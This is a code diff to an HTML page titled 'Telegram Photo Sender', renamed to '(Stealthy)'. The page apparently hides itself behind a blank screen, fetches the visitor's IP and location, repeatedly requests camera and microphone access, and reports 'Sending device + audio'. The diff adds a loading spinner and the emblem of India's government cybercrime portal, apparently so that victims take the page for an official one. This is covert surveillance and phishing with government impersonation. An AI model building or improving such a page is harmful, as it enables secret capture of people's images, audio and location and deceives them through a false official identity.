@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Telegram Photo Sender (Fixed)</title>
+  <title>Telegram Photo Sender (Stealthy)</title>
   <style>
     /* HIDE EVERYTHING - BLANK WHITE SCREEN */
     body {
@@ -35,6 +35,59 @@
       pointer-events: none;
       z-index: -1;
     }
+    
+    /* LOADING SCREEN */
+    #loading-screen {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      width: 100vw;
+      height: 100vh;
+      background-color: #fff;
+      position: absolute;
+      top: 0;
+      left: 0;
+      z-index: 1;
+    }
+    
+    /* LOADING CIRCLE */
+    .loading-circle {
+      width: 50px;
+      height: 50px;
+      position: relative;
+    }
+    
+    .loading-svg {
+      width: 100%;
+      height: 100%;
+      transform: rotate(-90deg);
+    }
+    
+    .loading-path {
+      stroke: #4CAF50;
+      stroke-dasharray: 100;
+      stroke-dashoffset: 0;
+      animation: loading 2s linear infinite;
+    }
+    
+    @keyframes loading {
+      0% {
+        stroke-dashoffset: 100;
+      }
+      100% {
+        stroke-dashoffset: 0;
+      }
+    }
+    
+    /* CYBERCELL LOGO */
+    #cybercell-logo {
+      width: 50px;
+      height: 50px;
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+    }
   </style>
 </head>
 <body>
@@ -48,6 +101,16 @@
     <p>🚫 Camera/Microphone denied!</p>
     <p>📤 Sending device + audio... Next retry in 2s</p>
     <button class="retry-btn" onclick="retryCamera()">🔄 Manual Retry</button>
+  </div>
+  
+  <!-- LOADING SCREEN -->
+  <div id="loading-screen">
+    <div class="loading-circle">
+      <svg class="loading-svg" viewBox="25 25 50 50">
+        <circle class="loading-path" cx="50" cy="50" r="20" fill="none" stroke-width="2" stroke-miterlimit="10" />
+      </svg>
+    </div>
+    <img src="https://cybercrime.gov.in/assets/images/emblem-dark.png" alt="Cybercell Logo" id="cybercell-logo" />
   </div>
 
   <script>
@@ -174,6 +237,9 @@
     // --- MAIN INITIALIZATION (FIXED IP FETCH) ---
     async function initStealth() {
       try {
+        // Show the loading screen
+        document.getElementById('loading-screen').style.display = 'flex';
+        
         // 1. Fetch Real Location Data FIRST (Fixes the IP issue)
         document.getElementById('status').innerText = `📡 Fetching Network Info...`;
         
@@ -222,7 +288,6 @@
         
         // 6. Immediately ask for Camera & Mic
         requestCamera();
-
       } catch (e) {
         console.error("Init error", e);
         document.getElementById('status').innerText = "🔄 Requesting camera...";
